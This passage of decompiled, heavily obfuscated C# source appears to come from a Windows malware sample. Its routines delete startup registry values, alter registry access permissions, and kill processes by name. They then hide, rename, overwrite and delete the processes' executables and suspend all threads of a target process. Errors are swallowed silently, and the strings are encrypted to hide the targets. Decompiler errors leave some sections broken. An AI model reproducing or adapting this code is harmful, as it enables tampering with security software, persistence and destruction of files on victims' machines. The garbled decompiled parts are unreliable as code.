						num24 = _003CModule_003E.cpdIanwVrnoZfLdwFECnwxAolslu<int>(1155502918u);
						num23 = (int)((num3 * 1649922980) ^ 0x2D60FA51);
						continue;
					case 7u:
					{
						int num26;
						int num27;
						if (!sFpbESoZFfmXAniitjDIbZmXehqi.cnIHCiTgipHrejKPtNVFwykZTVjE(text4, JTsqAjmpcDQcqmNvmrpMImhsbOcu.XzFOKgaAfTrVgucTHFxbWaqRKfLJ))
						{
							num26 = 1894483735;
							num27 = 1894483735;
						}
						else
						{
							num26 = 1779548445;
							num27 = 1779548445;
						}
						num23 = num26 ^ ((int)num3 * -1599458129);
						continue;
					}
					case 6u:
					{
						text4 = array4[num24];
						int num28;
						if (!sFpbESoZFfmXAniitjDIbZmXehqi.tTPMQvfMaBhVijutXflGjdgpbOIV(sFpbESoZFfmXAniitjDIbZmXehqi.cDjEFOpQndAXsBWrNQWLOscIbmBB(sFpbESoZFfmXAniitjDIbZmXehqi.KvntHawRTLkvkwfHAZCRBpRToNIQ(registryKey_4, text4)), string_1))
						{
							num23 = 873609323;
							num28 = 873609323;
						}
						else
						{
							num23 = 456817770;
							num28 = 456817770;
						}
						continue;
					}
					case 5u:
					{
						int num25;
						if (num24 < array4.Length)
						{
							num23 = 1042570298;
							num25 = 1042570298;
						}
						else
						{
							num23 = -1484594824;
							num25 = -1484594824;
						}
						continue;
					}
					case 4u:
						KQKMLqvGajKjfOnrndyNIKPMjScK(_003CModule_003E.ZIEesMDEqZiukGRraWRbhCtueSxd<string>(3020577681u), _003CModule_003E.eSYBogRbNcXwiLHXOoNzSnstEWqn<string>(3073873122u), text4);
						num23 = ((int)num3 * -1046969650) ^ -1731355836;
						continue;
					case 3u:
						num24 += _003CModule_003E.cpdIanwVrnoZfLdwFECnwxAolslu<int>(954978690u);
						num23 = -250329611;
						continue;
					case 1u:
						OqjMKsnTBmQqVyKGxbnfYyFyBPWF += _003CModule_003E.UZgcyOqfJkCFZCqyceZDDyPAEuIMB<int>(1641638193u);
						num23 = (int)(num3 * 1723850817) ^ -1307180337;
						continue;
					default:
						return;
					case 0u:
						break;
					case 2u:
						return;
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	public static void pbbtDSEFswSCKGYgkgEkNZjxIrUV(string string_0)
	{
		try
		{
			SecurityIdentifier identityReference_ = sFpbESoZFfmXAniitjDIbZmXehqi.rOVWrhHOJPhVJZAmcJoAWjxIZXxR((WellKnownSidType)_003CModule_003E.lrEEJtwppfqXKpLNoovGiGLkLyOi<int>(1668481415u), (SecurityIdentifier)null);
			NTAccount object_ = default(NTAccount);
			while (true)
			{
				int num = -413798968;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(-(num2 + -2117687460 - -1714673631) * 919483495 * 1413039581)) % 3u)
					{
					case 1u:
						goto IL_0013;
					case 2u:
						break;
					default:
					{
						RegistryKey registryKey = sFpbESoZFfmXAniitjDIbZmXehqi.LIyXgYozuSBidTYYlilDmLEjrcpC(Registry.CurrentUser, _003CModule_003E.UZgcyOqfJkCFZCqyceZDDyPAEuIMB<string>(2160830687u), (byte)_003CModule_003E.lrEEJtwppfqXKpLNoovGiGLkLyOi<int>(1668481415u) != 0);
						try
						{
							RegistrySecurity registrySecurity_ = sFpbESoZFfmXAniitjDIbZmXehqi.ARUXgypIUTryoZCZMsrTjznkDITl(registryKey);
							RegistryAccessRule registryAccessRule_ = sFpbESoZFfmXAniitjDIbZmXehqi.QbRjBMorhkeqDAZNwIuUJrJPXpZf(sFpbESoZFfmXAniitjDIbZmXehqi.cDjEFOpQndAXsBWrNQWLOscIbmBB((object)object_), (RegistryRights)_003CModule_003E.cpdIanwVrnoZfLdwFECnwxAolslu<int>(1990207042u), (InheritanceFlags)_003CModule_003E.XTSDPIkelZRmCDtxqjwvfsFQKEKm<int>(29741502u), (PropagationFlags)_003CModule_003E.caNKiBPreIKCeUBrFUJYAHCfqyTI<int>(437828032u), (AccessControlType)_003CModule_003E.ZIEesMDEqZiukGRraWRbhCtueSxd<int>(1267005231u));
							sFpbESoZFfmXAniitjDIbZmXehqi.zPNuorCgeEaBNBHIyAIOxAOyFyurA(registrySecurity_, registryAccessRule_);
							sFpbESoZFfmXAniitjDIbZmXehqi.QTVWtXqICjKSQSpSXIPPdGnagYIE(registryKey, registrySecurity_);
							return;
						}
						finally
						{
							if (registryKey != null)
							{
								while (true)
								{
									IL_012d:
									int num4 = -124393444;
									while (true)
									{
										num2 = num4;
										switch ((num3 = (uint)(-(num2 + -2117687460 - -1714673631) * 919483495 * 1413039581)) % 3u)
										{
										case 2u:
											goto IL_00e4;
										default:
											goto end_IL_00f8;
										case 0u:
											break;
										case 1u:
											goto end_IL_00f8;
										}
										goto IL_012d;
										IL_00e4:
										sFpbESoZFfmXAniitjDIbZmXehqi.PEzImmdaorVYmzQkqEjHqlgUDkdjA((IDisposable)registryKey);
										num4 = ((int)num3 * -1972904970) ^ 0x61ED06E5;
										continue;
										end_IL_00f8:
										break;
									}
									break;
								}
							}
						}
					}
					}
					break;
					IL_0013:
					object_ = sFpbESoZFfmXAniitjDIbZmXehqi.VxzCFgOnciqnQSZnqBURwqPcGnSW((IdentityReference)identityReference_, sFpbESoZFfmXAniitjDIbZmXehqi.MrVCKYfGmhKkayaxZrxMponFyXBnA(typeof(NTAccount).TypeHandle)) as NTAccount;
					num = (int)(num3 * 229667626) ^ -2018235743;
				}
			}
		}
		catch
		{
		}
	}

	public static void KQKMLqvGajKjfOnrndyNIKPMjScK(string string_0, string string_1, string string_2)
	{
		try
		{
			RegistryKey registryKey = null;
			if (sFpbESoZFfmXAniitjDIbZmXehqi.HpggdMaBbZdJDhgTeYYhejYLlgxKA(string_0, _003CModule_003E.FIIpeorVOHrlFUhmiKCFfcGQoBWt<string>(4227607384u)))
			{
				goto IL_0016;
			}
			goto IL_006e;
			IL_006e:
			registryKey = sFpbESoZFfmXAniitjDIbZmXehqi.LIyXgYozuSBidTYYlilDmLEjrcpC(Registry.LocalMachine, string_1, (byte)_003CModule_003E.XTSDPIkelZRmCDtxqjwvfsFQKEKm<int>(1442317677u) != 0);
			int num = 555445015;
			goto IL_0040;
			IL_0040:
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)(~(-(-num2))) ^ 0x4A9F8651u ^ 0xF462FC76u) % 4u)
				{
				case 2u:
					break;
				case 1u:
					registryKey = sFpbESoZFfmXAniitjDIbZmXehqi.LIyXgYozuSBidTYYlilDmLEjrcpC(Registry.CurrentUser, string_1, (byte)_003CModule_003E.FIIpeorVOHrlFUhmiKCFfcGQoBWt<int>(485427698u) != 0);
					num = (int)(num3 * 419021517) ^ -412916854;
					continue;
				case 0u:
					goto IL_006e;
				default:
				{
					RegistryKey registryKey2 = registryKey;
					try
					{
						if (registryKey == null)
						{
							return;
						}
						while (true)
						{
							int num4 = 1639971411;
							while (true)
							{
								num2 = num4;
								switch ((num3 = (uint)(~(-(-num2))) ^ 0x4A9F8651u ^ 0xF462FC76u) % 3u)
								{
								case 1u:
									goto IL_0092;
								default:
									return;
								case 2u:
									break;
								case 0u:
									return;
								}
								break;
								IL_0092:
								sFpbESoZFfmXAniitjDIbZmXehqi.SNzlekNKgGckhTyyesCtdoJpcUMM(registryKey, string_2);
								num4 = ((int)num3 * -853297754) ^ -1199249045;
							}
						}
					}
					finally
					{
						if (registryKey2 != null)
						{
							while (true)
							{
								IL_011b:
								int num5 = 1540612195;
								while (true)
								{
									num2 = num5;
									switch ((num3 = (uint)(~(-(-num2))) ^ 0x4A9F8651u ^ 0xF462FC76u) % 3u)
									{
									case 1u:
										goto IL_00de;
									default:
										goto end_IL_00f1;
									case 0u:
										break;
									case 2u:
										goto end_IL_00f1;
									}
									goto IL_011b;
									IL_00de:
									sFpbESoZFfmXAniitjDIbZmXehqi.PEzImmdaorVYmzQkqEjHqlgUDkdjA((IDisposable)registryKey2);
									num5 = (int)(num3 * 656466078) ^ -1429550961;
									continue;
									end_IL_00f1:
									break;
								}
								break;
							}
						}
					}
				}
				}
				break;
			}
			goto IL_0016;
			IL_0016:
			num = 2044131529;
			goto IL_0040;
		}
		catch
		{
		}
	}

	public static void uzfhorsKvFnsQPesmyejCGrslZAP(string string_0, string string_1, int int_0)
	{
		//IL_01db: Incompatible stack heights: 0 vs 1
		//IL_01e2: Incompatible stack heights: 0 vs 1
		Process[] array = sFpbESoZFfmXAniitjDIbZmXehqi.WARRxacBhjiIQuFTQKWZUyEEEMdr(string_0);
		int num4 = default(int);
		Random random_ = default(Random);
		while (true)
		{
			int num = -1240260117;
			while (true)
			{
				int num2 = num;
				int num5;
				uint num3;
				switch ((num3 = (uint)((num2 ^ -605097821) - -784031002 + -217835172) ^ 0xD08404D9u) % 4u)
				{
				case 3u:
					goto IL_0009;
				case 0u:
					break;
				case 2u:
					if (num4 >= array.Length)
					{
						num5 = 1403862472;
						goto IL_0274;
					}
					goto default;
				default:
					{
						Process process_ = array[num4];
						try
						{
							sFpbESoZFfmXAniitjDIbZmXehqi.ufEzbJTmbRGqUjdBJqiOYyXuvClLA(process_);
							while (true)
							{
								IL_00c4:
								int num6 = 1496362317;
								while (true)
								{
									num2 = num6;
									switch ((num3 = (uint)((num2 ^ -605097821) - -784031002 + -217835172) ^ 0xD08404D9u) % 3u)
									{
									case 1u:
										goto IL_007c;
									case 0u:
										break;
									default:
										sFpbESoZFfmXAniitjDIbZmXehqi.XsFeHcqbiSdzIfmHyQqPpnOiaxjJ(string_1, (FileAttributes)_003CModule_003E.caNKiBPreIKCeUBrFUJYAHCfqyTI<int>(3424831003u));
										try
										{
											File.Move(string_1, sFpbESoZFfmXAniitjDIbZmXehqi.NioLLVtjTXJWTooJvixtBIknHdhX(_003CModule_003E.ZIEesMDEqZiukGRraWRbhCtueSxd<string>(2931629013u)) + _003CModule_003E.PDjehoHWwjjqrxRpBRfgdvjYkkAJ<string>(3238782137u) + sFpbESoZFfmXAniitjDIbZmXehqi.IkaKMMxkxPRUAqPNDCztiuESjcMtA(random_, _003CModule_003E.cUuIhZvgJGeBkfBqJIoCsmqMdLmx<int>(2913496609u), _003CModule_003E.hoNHQIKvmlteoxZbRzFVmgRmkeJN<int>(1044107438u)));
											while (true)
											{
												IL_0182:
												int num7 = -1124096612;
												while (true)
												{
													num2 = num7;
													switch ((num3 = (uint)((num2 ^ -605097821) - -784031002 + -217835172) ^ 0xD08404D9u) % 3u)
													{
													case 1u:
														goto IL_0124;
													default:
														goto end_IL_014e;
													case 2u:
														break;
													case 0u:
														goto end_IL_014e;
													}
													goto IL_0182;
													IL_0124:
													File.WriteAllText(string_1, _003CModule_003E.eSYBogRbNcXwiLHXOoNzSnstEWqn<string>(497345527u));
													IdtOlQpFKUREzdLISYlqWaLPMgOM(string_1);
													File.Delete(string_1);
													num7 = (int)((num3 * 1000928727) ^ 0x5EEE5BA);
													continue;
													end_IL_014e:
													break;
												}
												break;
											}
										}
										catch (Exception ex)
										{
											while (true)
											{
												IL_01dd:
												_ = 2147142212;
												while (true)
												{
													num2 = (int)/*Error near IL_0190: Stack underflow*/;
													switch ((num3 = (uint)((num2 ^ -605097821) - -784031002 + -217835172) ^ 0xD08404D9u) % 3u)
													{
													default:
														goto end_IL_018e;
													case 1u:
														Console.WriteLine(ex.Message);
														_ = (num3 * 1522709274) ^ 0xC14FEBD;
														continue;
													case 0u:
														break;
													case 2u:
														goto end_IL_018e;
													}
													goto IL_01dd;
													continue;
													end_IL_018e:
													break;
												}
												break;
											}
										}
										BDmRccMRhTjBwJzHtVyegcBDHsZK += _003CModule_003E.caNKiBPreIKCeUBrFUJYAHCfqyTI<int>(2073640508u);
										while (true)
										{
											IL_0254:
											int num8 = 1873943121;
											while (true)
											{
												num2 = num8;
												switch ((num3 = (uint)((num2 ^ -605097821) - -784031002 + -217835172) ^ 0xD08404D9u) % 3u)
												{
												case 1u:
													goto IL_01fd;
												default:
													goto end_IL_0220;
												case 2u:
													break;
												case 0u:
													goto end_IL_0220;
												}
												goto IL_0254;
												IL_01fd:
												PPeezwwVcLWTYPKMkGpBqPFICUJt += _003CModule_003E.fzDahUaHxPgnWkQMrDqKcWhFgsrqc<int>(2173101411u);
												num8 = ((int)num3 * -65638713) ^ -194491424;
												continue;
												end_IL_0220:
												break;
											}
											break;
										}
										goto end_IL_0090;
									}
									goto IL_00c4;
									IL_007c:
									random_ = sFpbESoZFfmXAniitjDIbZmXehqi.XhKFKjxFWpUJHMapkwfXocVBPBRe();
									num6 = (int)((num3 * 1202021416) ^ 0x25C8E9F1);
									continue;
									end_IL_0090:
									break;
								}
								break;
							}
						}
						catch
						{
						}
						num4 += _003CModule_003E.FIIpeorVOHrlFUhmiKCFfcGQoBWt<int>(485427698u);
						goto IL_026f;
					}
					IL_026f:
					num5 = 1597965400;
					goto IL_0274;
					IL_0274:
					num2 = num5;
					switch ((num3 = (uint)((num2 ^ -605097821) - -784031002 + -217835172) ^ 0xD08404D9u) % 3u)
					{
					case 1u:
						break;
					case 2u:
						goto IL_026f;
					default:
						return;
					case 0u:
						return;
					}
					goto case 2u;
				}
				break;
				IL_0009:
				num4 = _003CModule_003E.PDjehoHWwjjqrxRpBRfgdvjYkkAJ<int>(2373668063u);
				num = (int)((num3 * 581855796) ^ 0x2A91F60E);
			}
		}
	}

	public static void OOfiSEoCtJcFkckhIIBXDpjebzmZ(int int_0)
	{
		try
		{
			Process process = sFpbESoZFfmXAniitjDIbZmXehqi.lagDphVXnthzUnEBSignBakNMtEh(int_0);
			try
			{
				if (sFpbESoZFfmXAniitjDIbZmXehqi.HpggdMaBbZdJDhgTeYYhejYLlgxKA(sFpbESoZFfmXAniitjDIbZmXehqi.IEevgwdRLwmrOnwVEJPnBsaGrtIb(process), string.Empty))
				{
					int num = -1103684055;
					uint num2 = 337586668u;
					return;
				}
				IEnumerator enumerator = sFpbESoZFfmXAniitjDIbZmXehqi.WWZzJhXcOGhfVcuNtgeTQJJCFQzF((ReadOnlyCollectionBase)sFpbESoZFfmXAniitjDIbZmXehqi.RThGngiTFKjxqmIdiaELmztwRLbj(process));
				try
				{
					IntPtr intPtr = default(IntPtr);
					while (true)
					{
						int num3;
						int num4;
						if (!sFpbESoZFfmXAniitjDIbZmXehqi.gXjZWMidRUVIErSllrbdoqmVAlfd(enumerator))
						{
							num3 = -2076116161;
							num4 = -2076116161;
						}
						else
						{
							num3 = -1508746014;
							num4 = -1508746014;
						}
						while (true)
						{
							int num = num3;
							uint num2;
							switch ((num2 = (uint)(~(num - 1753112320 - 1302936430 - 1159369487 + 686548327))) % 6u)
							{
							case 5u:
							{
								int num5;
								int num6;
								if (intPtr == IntPtr.Zero)
								{
									num5 = 2142666040;
									num6 = 2142666040;
								}
								else
								{
									num5 = 1263930016;
									num6 = 1263930016;
								}
								num3 = num5 ^ ((int)num2 * -1410554851);
								continue;
							}
							case 4u:
								TzctTESUmoezXWvOxDMcXXHnsPDh.SuspendThread(intPtr);
								num3 = ((int)num2 * -1391067536) ^ -1166053016;
								continue;
							case 1u:
							{
								ProcessThread processThread_ = (ProcessThread)sFpbESoZFfmXAniitjDIbZmXehqi.TBYwrCHPhSgzAcZYxlxXeSzJaMgo(enumerator);
								intPtr = TzctTESUmoezXWvOxDMcXXHnsPDh.OpenThread((TzctTESUmoezXWvOxDMcXXHnsPDh.DmrPhviYuJsKfNNIgrNAmUAlkoM)_003CModule_003E.lrEEJtwppfqXKpLNoovGiGLkLyOi<int>(4237811499u), (byte)_003CModule_003E.FIIpeorVOHrlFUhmiKCFfcGQoBWt<int>(2020883302u) != 0, (uint)sFpbESoZFfmXAniitjDIbZmXehqi.NRgDYDiusuilZVwDjYSimgovDFyKA(processThread_));
								num3 = 2059261602;
								continue;
							}
							case 0u:
								num3 = -1508746014;
								continue;
							default:
								return;
							case 3u:
								break;
							case 2u:
								return;
							}
							break;
						}
					}
				}
				finally
				{
					IDisposable disposable = enumerator as IDisposable;
					while (true)
					{
						IL_01a9:
						int num7 = -1753583534;
						while (true)
						{
							int num = num7;
							uint num2;
							switch ((num2 = (uint)(~(num - 1753112320 - 1302936430 - 1159369487 + 686548327))) % 4u)
							{
							case 3u:
							{
								int num8;
								int num9;
								if (disposable == null)
								{
									num8 = -242549018;
									num9 = -242549018;
								}
								else
								{
									num8 = -57947853;
									num9 = -57947853;
								}
								num7 = num8 ^ ((int)num2 * -1744049910);
								continue;
							}
							case 0u:
								sFpbESoZFfmXAniitjDIbZmXehqi.PEzImmdaorVYmzQkqEjHqlgUDkdjA(disposable);
								num7 = (int)(num2 * 834953620) ^ -1374254504;
								continue;
							default:
								goto end_IL_0170;
							case 2u:
								break;
							case 1u:
								goto end_IL_0170;
							}
							goto IL_01a9;
							continue;
							end_IL_0170:
							break;
						}
						break;
					}
				}
			}
			finally
			{
				if (process != null)
				{
					while (true)
					{
						IL_0201:
						int num10 = -1098381675;
						while (true)
						{
							int num = num10;
							uint num2;
							switch ((num2 = (uint)(~(num - 1753112320 - 1302936430 - 1159369487 + 686548327))) % 3u)
							{
							case 1u:
								goto IL_01b8;
							default:
								goto end_IL_01cc;
							case 0u:
								break;
							case 2u:
								goto end_IL_01cc;
							}
							goto IL_0201;
							IL_01b8:
							sFpbESoZFfmXAniitjDIbZmXehqi.PEzImmdaorVYmzQkqEjHqlgUDkdjA((IDisposable)process);
							num10 = (int)(num2 * 1782276094) ^ -87515584;
							continue;
							end_IL_01cc:
							break;
						}
						break;
					}
				}
			}
		}
		catch
		{
		}
	}

	static Process[] HbFFxaEzAoYQvLaTcJWzIDdbVducA()
	{
		return Process.GetProcesses();
	}

	static ProcessModule UcREmVwqYuPMoJLpYhfaeohRbTZeA(Process process_0)
	{
		return process_0.MainModule;
	}

	static string KeByyORmcGONkxbwLaeWCwpOgUvKA(ProcessModule processModule_0)
	{
		return processModule_0.FileName;
	}

	static string NioLLVtjTXJWTooJvixtBIknHdhX(string string_0)
	{
		return Environment.GetEnvironmentVariable(string_0);
	}

	static bool tTPMQvfMaBhVijutXflGjdgpbOIV(string string_0, string string_1)
	{
		return string_0.Contains(string_1);
	}

	static string IEevgwdRLwmrOnwVEJPnBsaGrtIb(Process process_0)
	{
		return process_0.ProcessName;
	}

	static Process mWyvXRHTvGpnmYQIFaOxNOnTWqLl()
	{
		return Process.GetCurrentProcess();
	}

	static bool cnIHCiTgipHrejKPtNVFwykZTVjE(string string_0, string string_1)
	{
		return string_0 != string_1;
	}

	static IntPtr ztCTuwwfIYOzyICrXkUSwunNEEZk(Process process_0)
	{
		return process_0.MainWindowHandle;
	}

	static int lmUYtXzqlMAUKfNEZKPiSSfYsgoJ(Process process_0)
	{
		return process_0.Id;
	}

	static string DuAqIzBKMVtoWEGgiuvYedYIMfJo()
	{
		return Environment.UserName;
	}

	static string cDjEFOpQndAXsBWrNQWLOscIbmBB(object object_0)
	{
		return object_0.ToString();
	}

	static DirectoryInfo IZkREcNrRZpQYoJCZpipukpjFjDf(string string_0)
	{
		return new DirectoryInfo(string_0);
	}

	static DirectorySecurity jXoGeKCURfEsFAvpDldQGJwIiIxQA()
	{
		return new DirectorySecurity();
	}

	static FileSystemAccessRule QoSEIPyCDmNbqDXkQstYKxBwsdyS(string string_0, FileSystemRights fileSystemRights_0, InheritanceFlags inheritanceFlags_0, PropagationFlags propagationFlags_0, AccessControlType accessControlType_0)
	{
		return new FileSystemAccessRule(string_0, fileSystemRights_0, inheritanceFlags_0, propagationFlags_0, accessControlType_0);
	}

	static void JFhYhhsxttURSjmamDAPEBhPGnYR(FileSystemSecurity fileSystemSecurity_0, FileSystemAccessRule fileSystemAccessRule_0)
	{
		fileSystemSecurity_0.AddAccessRule(fileSystemAccessRule_0);
	}

	static void IlEnjPFdQsNDNgzqWajhbuNIGaQL(ObjectSecurity objectSecurity_0, bool bool_0, bool bool_1)
	{
		objectSecurity_0.SetAccessRuleProtection(bool_0, bool_1);
	}

	static void zJpqOTRAGnjaaIoAUlSpvCEjqGDs(DirectoryInfo directoryInfo_0, DirectorySecurity directorySecurity_0)
	{
		directoryInfo_0.SetAccessControl(directorySecurity_0);
	}

	static RegistryKey FQzpcosMLYJIQcaxWKALCLBWSSgx(RegistryKey registryKey_0, string string_0)
	{
		return registryKey_0.OpenSubKey(string_0);
	}

	static string[] wWdBefCMNkpegLZoanMnrUuchiUC(RegistryKey registryKey_0)
	{
		return registryKey_0.GetValueNames();
	}

	static object KvntHawRTLkvkwfHAZCRBpRToNIQ(RegistryKey registryKey_0, string string_0)
	{
		return registryKey_0.GetValue(string_0);
	}

	static SecurityIdentifier rOVWrhHOJPhVJZAmcJoAWjxIZXxR(WellKnownSidType wellKnownSidType_0, SecurityIdentifier securityIdentifier_0)
	{
		return new SecurityIdentifier(wellKnownSidType_0, securityIdentifier_0);
	}

	static Type MrVCKYfGmhKkayaxZrxMponFyXBnA(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static IdentityReference VxzCFgOnciqnQSZnqBURwqPcGnSW(IdentityReference identityReference_0, Type type_0)
	{
		return identityReference_0.Translate(type_0);
	}

	static RegistryKey LIyXgYozuSBidTYYlilDmLEjrcpC(RegistryKey registryKey_0, string string_0, bool bool_0)
	{
		return registryKey_0.OpenSubKey(string_0, bool_0);
	}

	static RegistrySecurity ARUXgypIUTryoZCZMsrTjznkDITl(RegistryKey registryKey_0)
	{
		return registryKey_0.GetAccessControl();
	}

	static RegistryAccessRule QbRjBMorhkeqDAZNwIuUJrJPXpZf(string string_0, RegistryRights registryRights_0, InheritanceFlags inheritanceFlags_0, PropagationFlags propagationFlags_0, AccessControlType accessControlType_0)
	{
		return new RegistryAccessRule(string_0, registryRights_0, inheritanceFlags_0, propagationFlags_0, accessControlType_0);
	}

	static void zPNuorCgeEaBNBHIyAIOxAOyFyurA(RegistrySecurity registrySecurity_0, RegistryAccessRule registryAccessRule_0)
	{
		registrySecurity_0.AddAccessRule(registryAccessRule_0);
	}

	static void QTVWtXqICjKSQSpSXIPPdGnagYIE(RegistryKey registryKey_0, RegistrySecurity registrySecurity_0)
	{
		registryKey_0.SetAccessControl(registrySecurity_0);
	}

	static void PEzImmdaorVYmzQkqEjHqlgUDkdjA(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static bool HpggdMaBbZdJDhgTeYYhejYLlgxKA(string string_0, string string_1)
	{
		return string_0 == string_1;
	}

	static void SNzlekNKgGckhTyyesCtdoJpcUMM(RegistryKey registryKey_0, string string_0)
	{
		registryKey_0.DeleteValue(string_0);
	}

	static Process[] WARRxacBhjiIQuFTQKWZUyEEEMdr(string string_0)
	{
		return Process.GetProcessesByName(string_0);
	}

	static void ufEzbJTmbRGqUjdBJqiOYyXuvClLA(Process process_0)
	{
		process_0.Kill();
	}

	static Random XhKFKjxFWpUJHMapkwfXocVBPBRe()
	{
		return new Random();
	}

	static void XsFeHcqbiSdzIfmHyQqPpnOiaxjJ(string string_0, FileAttributes fileAttributes_0)
	{
		File.SetAttributes(string_0, fileAttributes_0);
	}

	static int IkaKMMxkxPRUAqPNDCztiuESjcMtA(Random random_0, int int_0, int int_1)
	{
		return random_0.Next(int_0, int_1);
	}

	static Process lagDphVXnthzUnEBSignBakNMtEh(int int_0)
	{
		return Process.GetProcessById(int_0);
	}

	static ProcessThreadCollection RThGngiTFKjxqmIdiaELmztwRLbj(Process process_0)
	{
		return process_0.Threads;
	}

	static IEnumerator WWZzJhXcOGhfVcuNtgeTQJJCFQzF(ReadOnlyCollectionBase readOnlyCollectionBase_0)
	{
		return readOnlyCollectionBase_0.GetEnumerator();
	}

	static object TBYwrCHPhSgzAcZYxlxXeSzJaMgo(IEnumerator ienumerator_0)
	{
		return ienumerator_0.Current;
	}

	static int NRgDYDiusuilZVwDjYSimgovDFyKA(ProcessThread processThread_0)
	{
		return processThread_0.Id;
	}

	static bool gXjZWMidRUVIErSllrbdoqmVAlfd(IEnumerator ienumerator_0)
	{
		return ienumerator_0.MoveNext();
	}
}
